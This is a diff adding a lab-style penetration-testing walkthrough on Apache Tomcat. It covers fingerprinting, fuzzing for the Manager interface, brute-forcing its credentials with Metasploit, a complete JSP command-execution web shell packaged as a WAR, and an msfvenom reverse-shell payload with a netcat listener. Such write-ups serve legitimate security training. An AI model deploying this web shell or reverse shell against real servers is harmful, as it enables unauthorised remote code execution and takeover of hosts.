@@ -20,6 +20,7 @@ This document outlines common techniques for identifying and exploiting vulnerab
 
   - [Servlet Containers/Software Development](#servlet-containerssoftware-development)
     - [Tomcat - Discovery and Enumeration](#tomcat---discovery-and-enumeration)
+    - [Attacking Tomcat](#attacking-tomcat)
 
 ---
 
@@ -740,3 +741,266 @@ If valid credentials are available, the vulnerability can be exploited using `Me
 ## Servlet Containers/Software Development
 
 ### Tomcat - Discovery and Enumeration
+
+Apache Tomcat is an open-source **Java servlet container** used to host Java-based web applications. While Tomcat is less commonly exposed directly to the internet compared to traditional web servers, it frequently appears during internal penetration tests and is occasionally encountered in external assessments.
+
+Tomcat instances can often be identified through HTTP response headers or default page content:
+
+```bash
+curl -s http://app-dev.inlanefreight.local:8080/ | grep -i "tomcat"
+```
+
+The response confirms that the target is running Apache Tomcat version `9.0.3`:
+
+![Filtered output](images/tomcat.PNG)
+
+In some cases, administrators configure **custom error pages** that suppress version information. When this occurs, an alternative fingerprinting technique is to access the default Tomcat documentation page, which is frequently left exposed:
+
+```
+/docs
+```
+
+Example:
+
+```bash
+curl -s http://app-dev.inlanefreight.local:8080/docs | grep -i "tomcat"
+```
+
+A default Apache Tomcat installation contains the following directory structure:
+
+![Filtered output](images/tomcat2.PNG)
+
+The most important directory from an attacker’s perspective is:
+
+```
+/webapps
+```
+
+This directory serves as Tomcat’s **default webroot**. Each subdirectory under `webapps` represents a deployed Java web application and typically follows this structure:
+
+![Filtered output](images/tomcat3.PNG)
+
+The most critical file within a Java web application is:
+
+```
+WEB-INF/web.xml
+
+```
+
+This file is known as the deployment descriptor and defines:
+
+- Application routes (URL patterns)
+- Servlets handling incoming requests
+- Access control and configuration logic
+
+Misconfigurations or vulnerabilities related to this file can result in **complete compromise** of the application.
+
+Example `web.xml` file:
+
+```xml
+<?xml version="1.0" encoding="ISO-8859-1"?>
+
+<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
+
+<web-app>
+  <servlet>
+    <servlet-name>AdminServlet</servlet-name>
+    <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
+  </servlet>
+
+  <servlet-mapping>
+    <servlet-name>AdminServlet</servlet-name>
+    <url-pattern>/admin</url-pattern>
+  </servlet-mapping>
+</web-app> 
+```
+
+This configuration defines a servlet named `AdminServlet`, implemented by the Java class:
+
+```
+com.inlanefreight.api.AdminServlet
+```
+
+Java uses dot notation to represent package paths. The corresponding compiled class file would be located at:
+
+```
+classes/com/inlanefreight/api/AdminServlet.class
+```
+
+Understanding servlet mappings is crucial during enumeration, as sensitive functionality is often exposed through **poorly protected servlet endpoints**.
+
+After fingerprinting the Tomcat version, a common next step is to check for exposed administrative interfaces:
+
+- `/manager`
+- `/host-manager`
+
+These endpoints are frequently misconfigured or protected with **weak credentials**.
+
+Fuzzing can be used to quickly identify their presence:
+
+```bash
+ffuf -w directory-list-2.3-small.txt:FUZZ -u http://web01.inlanefreight.local:8180/FUZZ -ic
+```
+
+![Filtered output](images/tomcat4.PNG)
+
+If accessible, these interfaces often allow:
+
+- Application deployment
+- WAR file uploads
+- Full remote code execution
+
+---
+
+### Attacking Tomcat
+
+If the `/manager` or `/host-manager` endpoints are accessible, it is often possible to achieve remote code execution (RCE) on the Tomcat server.
+
+When attempting to authenticate using the credentials `admin:admin`, the server responds with an HTTP Basic Authentication challenge:
+
+```
+Authorization: Basic YWRtaW46YWRtaW4=
+```
+
+![Filtered output](images/tomcat5.PNG)
+
+This indicates that Tomcat Manager is protected using **basic authentication**, which is frequently misconfigured with **weak or default credentials**.
+
+The `Metasploit` module ´scanner/http/tomcat_mgr_login` can be used to brute-force valid credentials:
+
+```
+use scanner/http/tomcat_mgr_login
+set VHOST web01.inlanefreight.local
+set RPORT 8180
+set RHOSTS 10.129.201.58
+set stop_on_success true
+exploit
+```
+
+Valid credentials are discovered:
+
+```
+tomcat:root
+```
+
+![Filtered output](images/tomcat6.PNG)
+
+Using the recovered credentials, authentication succeeds and access to the **Tomcat Web Application Manager** is granted:
+
+```
+/manager/html
+```
+
+![Filtered output](images/tomcat7.PNG)
+
+The Manager interface allows authenticated users to:
+
+- Deploy and undeploy applications
+- Upload WAR archives
+- Execute arbitrary code via uploaded applications
+
+Tomcat applications are deployed using **Web Application Archive (WAR)** files. By uploading a malicious WAR file, an attacker can gain code execution on the underlying system.
+
+A simple **JSP** web shell is created with the following content:
+
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<%
+//
+// JSP_KIT
+//
+// cmd.jsp = Command Execution (unix)
+//
+// by: Unknown
+// modified: 27/06/2003
+//
+%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+
+Save the file as `cmd.jsp`, then package it into a WAR archive:
+
+```bash
+zip -r backup.war cmd.jsp 
+```
+
+![Filtered output](images/tomcat8.PNG)
+
+Under the `Deploy` section, click on `Select WAR file to upload` and then on `Deploy`:
+
+![Filtered output](images/tomcat9.PNG)
+
+The application appears in the `Applications` list, confirming successful deployment:
+
+![Filtered output](images/tomcat10.PNG)
+
+The deployed application is accessible at:
+
+```
+http://web01.inlanefreight.local:8180/backup/cmd.jsp
+```
+
+Commands can be executed using the `cmd` parameter:
+
+```bash
+http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
+
+or
+
+```bash
+curl -s http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+```
+
+![Filtered output](images/tomcat11.PNG)
+
+This confirms successful remote code execution on the Tomcat host.
+
+A reverse shell can be obtained using `msfvenom` to generate a malicious JSP WAR payload:
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=1337 -f war > backup.war
+```
+
+Upload the generated `backup.war` file using the same process as before.
+
+Start a listener on the attacking machine:
+
+```bash
+nc -lvnp 1337
+```
+
+Trigger the payload by accessing the deployed application through the browser or Manager interface:
+
+![Filtered output](images/tomcat12.PNG)
+
+A reverse shell is successfully established:
+
+![Filtered output](images/tomcat13.PNG)
+
+Apache Tomcat is a **high-value target** in both internal and external penetration tests. Whenever a Tomcat instance is discovered, the **Manager and Host Manager interfaces should be immediately assessed** for weak or default credentials.
+
+If access is obtained, it can typically be converted into **full remote code execution within minutes**. Tomcat frequently runs with **high privileges** (e.g., `root` or `SYSTEM`), making it an excellent foothold for further lateral movement in both Linux environments and domain-joined Windows systems.
+
+---
